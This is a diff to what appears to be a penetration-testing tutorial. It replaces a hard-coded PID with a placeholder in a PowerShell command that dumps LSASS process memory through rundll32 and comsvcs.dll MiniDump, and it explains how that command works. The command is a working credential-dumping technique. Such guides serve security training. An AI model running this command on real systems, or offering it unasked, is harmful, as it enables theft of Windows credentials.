@@ -61,7 +61,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 Once we have the PID assigned to the LSASS process, we can create a dump file with an elevated Powershell session:
 
 ```pwsh
-PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <Process_Id> C:\lsass.dmp full
 ```
 
 With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).
